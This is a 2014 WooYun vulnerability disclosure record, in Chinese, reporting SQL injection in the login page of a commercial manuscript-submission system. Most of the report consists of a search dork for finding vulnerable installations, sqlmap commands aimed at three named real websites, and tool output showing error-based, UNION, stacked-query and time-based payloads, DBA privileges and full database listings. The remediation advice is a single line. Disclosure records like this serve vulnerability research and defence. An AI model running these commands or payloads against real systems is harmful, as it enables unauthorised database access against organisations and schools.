{"id": 52805, "wybug_id": "wooyun-2014-070091", "wybug_title": "某投稿系统通用型SQL注射漏洞（影响众多企事业单位及学校）", "wybug_corp": "南京杰诺瀚软件科技有限公司", "wybug_author": "路人甲", "wybug_date": "2014-07-29 16:00", "wybug_open_date": "2014-10-27 16:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-27：\t细节向公众公开  简要描述： 某投稿系统通用型SQL注射漏洞 详细说明：  南京杰诺瀚软件科技有限公司的投稿系统SQL注射漏洞\nintitle:投稿系统 技术支持：南京杰诺瀚软件科技有限公司\nWeb/Login.aspx   页面的username  参数存在问题 DBA 权限注射URL:\nhttp://209.116.186.246/#newwindow=1&q=intitle:%E6%8A%95%E7%A8%BF%E7%B3%BB%E7%BB%9F+%E6%8A%80%E6%9C%AF%E6%94%AF%E6%8C%81%EF%BC%9A%E5%8D%97%E4%BA%AC%E6%9D%B0%E8%AF%BA%E7%80%9A%E8%BD%AF%E4%BB%B6%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8\n1：sqlmap.py -u \"http://www.cnemergency.com/Web/Login.aspx\" --data \"username=\" --is-dba --dbs\n---Place: POSTParameter: username    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: username=' AND 3756=CONVERT(INT,(SELECT CHAR(113)+CHAR(108)+CHAR(106)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (3756=3756) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(109)+CHAR(118)+CHAR(113))) AND 'OGZf'='OGZf    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: username=' UNION ALL SELECT CHAR(113)+CHAR(108)+CHAR(106)+CHAR(104)+CHAR(113)+CHAR(87)+CHAR(65)+CHAR(85)+CHAR(70)+CHAR(71)+CHAR(89)+CHAR(102)+CHAR(109)+CHAR(101)+CHAR(111)+CHAR(113)+CHAR(113)+CHAR(109)+CHAR(118)+CHAR(113)-----[10:49:50] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000[10:49:50] [INFO] testing if current user is DBAcurrent user is DBA:    Trueavailable databases [57]:[*] bl[*] cdxxgc[*] cghy[*] cymx[*] d1[*] demcom[*] demo[*] dj[*] dxjykx[*] Eye[*] gjzhyx[*] GuaHao[*] hh[*] hhzrkx[*] hlgl[*] hnxbyx[*] hxyqdz[*] j4e[*] jjyx[*] lcjsyx[*] lcjyzzs[*] lcsjbx[*] lcsjwk[*] lnyxybj[*] main[*] master[*] mfskin[*] model[*] mrzxwk[*] msdb[*] mz[*] mzyfs[*] njsd[*] nky[*] Northwind[*] nxgb[*] nydxxb[*] pifu[*] pubs[*] rfic[*] SMS[*] st[*] sypfb[*] tempdb[*] test[*] wcbx[*] wf[*] wlxb[*] xdx[*] xhnj[*] xjyx[*] xnxyxb[*] yxjz[*] zdblx[*] zjyx[*] zr[*] zxyjh\n\n\n2：sqlmap.py -u \"http://www.j4eseu.com/Web/Login.aspx\" --data \"username=\" --is-dba --dbs\n---Place: POSTParameter: username    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: username=' UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(112)+CHAR(101)+CHAR(113)+CHAR(102)+CHAR(90)+CHAR(73)+CHAR(89)+CHAR(105)+CHAR(108)+CHAR(80)+CHAR(98)+CHAR(83)+CHAR(85)+CHAR(113)+CHAR(97)+CHAR(122)+CHAR(120)+CHAR(113)--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: username='; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: username=' WAITFOR DELAY '0:0:5'-----[11:01:03] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000[11:01:03] [INFO] testing if current user is DBAcurrent user is DBA:    Trueavailable databases [57]:[*] bl[*] cdxxgc[*] cghy[*] cymx[*] d1[*] demcom[*] demo[*] dj[*] dxjykx[*] Eye[*] gjzhyx[*] GuaHao[*] hh[*] hhzrkx[*] hlgl[*] hnxbyx[*] hxyqdz[*] j4e[*] jjyx[*] lcjsyx[*] lcjyzzs[*] lcsjbx[*] lcsjwk[*] lnyxybj[*] main[*] master[*] mfskin[*] model[*] mrzxwk[*] msdb[*] mz[*] mzyfs[*] njsd[*] nky[*] Northwind[*] nxgb[*] nydxxb[*] pifu[*] pubs[*] rfic[*] SMS[*] st[*] sypfb[*] tempdb[*] test[*] wcbx[*] wf[*] wlxb[*] xdx[*] xhnj[*] xjyx[*] xnxyxb[*] yxjz[*] zdblx[*] zjyx[*] zr[*] zxyjh\n\n\n3：sqlmap.py -u \"http://www.linpi.net/Web/Login.aspx\" --data \"username=\"--is-dba --dbs\n---Place: POSTParameter: username    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: username=' UNION ALL SELECT CHAR(113)+CHAR(122)+CHAR(114)+CHAR(117)+CHAR(113)+CHAR(66)+CHAR(106)+CHAR(118)+CHAR(75)+CHAR(112)+CHAR(66)+CHAR(80)+CHAR(80)+CHAR(83)+CHAR(68)+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(120)+CHAR(113)--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: username='; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: username=' WAITFOR DELAY '0:0:5'-----[11:03:16] [INFO] testing Microsoft SQL Server[11:03:19] [INFO] confirming Microsoft SQL Server[11:03:21] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000[11:03:21] [INFO] testing if current user is DBAcurrent user is DBA:    Trueavailable databases [57]:[*] bl[*] cdxxgc[*] cghy[*] cymx[*] d1[*] demcom[*] demo[*] dj[*] dxjykx[*] Eye[*] gjzhyx[*] GuaHao[*] hh[*] hhzrkx[*] hlgl[*] hnxbyx[*] hxyqdz[*] j4e[*] jjyx[*] lcjsyx[*] lcjyzzs[*] lcsjbx[*] lcsjwk[*] lnyxybj[*] main[*] master[*] mfskin[*] model[*] mrzxwk[*] msdb[*] mz[*] mzyfs[*] njsd[*] nky[*] Northwind[*] nxgb[*] nydxxb[*] pifu[*] pubs[*] rfic[*] SMS[*] st[*] sypfb[*] tempdb[*] test[*] wcbx[*] wf[*] wlxb[*] xdx[*] xhnj[*] xjyx[*] xnxyxb[*] yxjz[*] zdblx[*] zjyx[*] zr[*] zxyjh\n\n\n   漏洞证明：  上面   修复方案：  加强过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-08-03 09:01 厂商回复：   最新状态： 2014-08-04：CNVD确认并复现所述情况，已经由CNVD通报网站公开邮箱向软件生产厂商通报（电话无人回应）。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}